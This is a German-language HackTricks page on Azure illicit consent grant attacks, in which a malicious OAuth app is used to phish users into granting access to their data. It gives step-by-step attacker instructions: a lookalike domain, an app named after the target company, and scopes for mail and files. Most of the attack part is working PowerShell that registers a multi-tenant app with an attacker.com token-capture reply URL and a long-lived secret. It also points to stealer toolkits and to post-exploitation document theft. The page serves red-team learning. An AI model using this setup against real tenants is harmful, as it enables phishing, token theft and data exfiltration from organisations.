# Az - Illegitime Zustimmungserteilung

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## OAuth-App-Phishing

**Azure-Anwendungen** fordern Berechtigungen zum Zugriff auf die **Benutzerdaten** an (Grundlegende Informationen, aber auch Zugriff auf Dokumente, Senden von E-Mails...).\
Wenn **zugelassen**, kann ein normaler Benutzer nur die Zustimmung f√ºr **"Niedrige Auswirkungen-Berechtigungen"** erteilen. In **allen anderen** F√§llen ist **Administratorzustimmung erforderlich**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` und eine benutzerdefinierte Rolle, die `Berechtigungen zum Erteilen von Berechtigungen an Anwendungen` enth√§lt, k√∂nnen eine mandantenweite Zustimmung erteilen.

Nur Berechtigungen, die **keine Administratorzustimmung erfordern**, werden als **niedrige Auswirkungen** klassifiziert. Diese Berechtigungen sind f√ºr die **grundlegende Anmeldung erforderlich: openid, Profil, E-Mail, User.Read und offline\_access**. Wenn eine **Organisation** die Benutzerzustimmung f√ºr **alle Apps zul√§sst**, kann ein Mitarbeiter einer App die Zustimmung erteilen, um **die oben genannten Informationen aus seinem Profil zu lesen**.

<figure><img src="../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

Daher k√∂nnte ein Angreifer eine **b√∂sartige App** vorbereiten und mit einem **Phishing** den Benutzer dazu bringen, die App zu **akzeptieren und seine Daten zu stehlen**.

### 2 Arten von Angriffen durch illegitime Zustimmungserteilung

* **Unauthentifiziert**: Erstellen Sie von einem externen Konto aus eine Anwendung mit den Berechtigungen `User.Read` und `User.ReadBasic.All` und fischen Sie z. B. einen Benutzer, um auf Verzeichnisinformationen zugreifen zu k√∂nnen.
* Dies erfordert, dass der gefischte Benutzer OAuth-Apps aus externen Umgebungen akzeptieren kann!
* **Authentifiziert**: Nachdem ein Hauptkonto mit ausreichenden Berechtigungen kompromittiert wurde, erstellen Sie eine Anwendung im Konto und fischen Sie einen privilegierten Benutzer, der privilegierte OAuth-Berechtigungen akzeptieren kann.
* In diesem Fall k√∂nnen Sie bereits auf die Informationen des Verzeichnisses zugreifen, daher ist die Berechtigung `User.ReadBasic.All` nicht mehr interessant.
* Sie sind wahrscheinlich an **Berechtigungen interessiert, f√ºr die ein Administrator sie erteilen muss**, da ein normaler Benutzer OAuth-Apps keine Berechtigung erteilen kann. Deshalb m√ºssen Sie **nur diese Benutzer fischen** (mehr dazu, welche Rollen/Berechtigungen dieses Privileg gew√§hren, sp√§ter)

### √úberpr√ºfen, ob Benutzer Zustimmung erteilen d√ºrfen

Der folgende PowerShell-Befehl wird verwendet, um die Zustimmungskonfiguration f√ºr Benutzer in Azure Active Directory (Azure AD) in Bezug auf ihre F√§higkeit zu √ºberpr√ºfen, Anwendungen zuzustimmen:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **Deaktivieren der Benutzerzustimmung**: Diese Einstellung verbietet Benutzern, Berechtigungen an Anwendungen zu erteilen. Es ist keine Benutzerzustimmung zu Anwendungen erlaubt.
* **Benutzer k√∂nnen Apps von verifizierten Herausgebern oder Ihrer Organisation zustimmen, jedoch nur f√ºr ausgew√§hlte Berechtigungen**: Diese Einstellung erlaubt allen Benutzern nur die Zustimmung zu Anwendungen, die von einem verifizierten Herausgeber ver√∂ffentlicht wurden und Anwendungen, die in Ihrem eigenen Mandanten registriert sind. Es f√ºgt eine Kontrollebene hinzu, indem nur f√ºr spezifische Berechtigungen Zustimmung erteilt wird.
* **Benutzer k√∂nnen allen Apps zustimmen**: Diese Einstellung ist gro√üz√ºgiger und erlaubt allen Benutzern, jeder Anwendung zuzustimmen, solange diese Berechtigungen keine administrative Zustimmung erfordern.
* **Benutzerdefinierte App-Zustimmungsrichtlinie**: Diese Einstellung zeigt an, dass eine benutzerdefinierte Richtlinie vorhanden ist, die an spezifische organisatorische Anforderungen angepasst werden kann und eine Kombination von Einschr√§nkungen basierend auf dem App-Herausgeber, den angeforderten Berechtigungen der App und anderen Faktoren beinhalten kann.

## **Verst√§ndnis des Angriffs durch illegale Zustimmung**

Bei einem Angriff durch illegale Zustimmung √ºberlisten Angreifer Endbenutzer, um Berechtigungen f√ºr eine b√∂sartige Anwendung zu erteilen, die bei Azure registriert ist. Dies geschieht, indem die Anwendung als legitim erscheint und Opfer unwissentlich auf eine Schaltfl√§che "Akzeptieren" klicken. Als Ergebnis stellt Azure AD einem Angreifer eine Token aus, die es ihnen erm√∂glichen, auf die Daten des Opfers zuzugreifen und diese zu manipulieren, wie beispielsweise das Lesen oder Senden von E-Mails und den Zugriff auf Dateien, ohne ein organisatorisches Konto zu ben√∂tigen.

## **√úberblick √ºber den Angriffsablauf**

Der Angriff umfasst mehrere Schritte, die auf ein generisches Unternehmen abzielen. So k√∂nnte er sich entfalten:

1. **Domainregistrierung und Anwendungshosting**: Der Angreifer registriert eine Domain, die einer vertrauensw√ºrdigen Website √§hnelt, z. B. "sicheredomainanmeldung.com". Unter dieser Domain wird ein Subdomain erstellt (z. B. "firmenname.sicheredomainanmeldung.com"), um eine Anwendung zu hosten, die dazu dient, Autorisierungscodes zu erfassen und Zugriffstoken anzufordern.
2. **Registrierung der Anwendung in Azure AD**: Der Angreifer registriert dann eine Multi-Tenant-Anwendung in seinem Azure AD-Mandanten und benennt sie nach dem Zielunternehmen, um als legitim zu erscheinen. Sie konfigurieren die Redirect-URL der Anwendung so, dass sie auf die Subdomain zeigt, auf der die b√∂sartige Anwendung gehostet wird.
3. **Einrichten von Berechtigungen**: Der Angreifer richtet die Anwendung mit verschiedenen API-Berechtigungen ein (z. B. `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`). Diese Berechtigungen erm√∂glichen es dem Angreifer, im Namen des Benutzers sensible Informationen abzurufen, sobald sie vom Benutzer erteilt wurden.
4. **Verteilen von b√∂sartigen Links**: Der Angreifer erstellt einen Link, der die Client-ID der b√∂sartigen Anwendung enth√§lt, und teilt ihn mit gezielten Benutzern, um sie zur Zustimmung zu verleiten.

## **Verwendung von Tools f√ºr den Angriff**

Der Angriff kann mithilfe von Tools wie [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer) erleichtert werden.

### Vorbereitung vor dem Angriff:

Wenn der Angreifer auf irgendeiner Ebene Zugriff auf einen Benutzer in der Opferorganisation hat, k√∂nnte er √ºberpr√ºfen, ob die Richtlinie der Organisation es dem Benutzer erlaubt, Apps zu akzeptieren:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
Um den Angriff auszuf√ºhren, m√ºsste der Angreifer eine **neue App in seinem Azure-Mandanten** (in App-Registrierungen) erstellen, konfiguriert mit den Berechtigungen:

<figure><img src="../../../.gitbook/assets/image (2) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` befindet sich in `Microsoft Graph` unter `Delegated permissions`. (Anwendungsrechte erfordern immer zus√§tzliche Genehmigungen).

* `User.ReadBasic.All` ist die Berechtigung, die es Ihnen erm√∂glicht, **Informationen aller Benutzer** in der Organisation zu **lesen**, wenn sie gew√§hrt wird.
* Denken Sie daran, dass nur `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` und eine benutzerdefinierte Rolle, die `Berechtigung zum Gew√§hren von Berechtigungen an Anwendungen` enth√§lt, eine mandantenweite Zustimmung erteilen k√∂nnen. Daher sollten Sie versuchen, einen Benutzer mit einer dieser Rollen zu **phishen**, wenn Sie m√∂chten, dass er eine **App genehmigt, die eine Administratorzustimmung erfordert**.

Sie k√∂nnten auch eine App √ºber die Befehlszeile erstellen mit:

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

√úberpr√ºfen Sie [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer), um zu erfahren, wie Sie es konfigurieren k√∂nnen.

{% hint style="warning" %}
Beachten Sie, dass das erhaltene **Zugriffstoken** f√ºr den **Graph-Endpunkt** mit den Berechtigungen `User.Read` und `User.ReadBasic.All` (die angeforderten Berechtigungen) sein wird. Sie k√∂nnen keine anderen Aktionen durchf√ºhren (aber diese sind ausreichend, um **Informationen √ºber alle Benutzer** in der Organisation herunterzuladen).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

Sie k√∂nnten auch dieses Tool verwenden, um diesen Angriff durchzuf√ºhren.

## Post-Exploitation

Sobald Sie Zugriff auf den Benutzer haben, k√∂nnen Sie Dinge wie das Stehlen sensibler Dokumente und sogar das Hochladen von Backdoored-Dokumentdateien tun.

## Referenzen

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen** oder **HackTricks in PDF herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
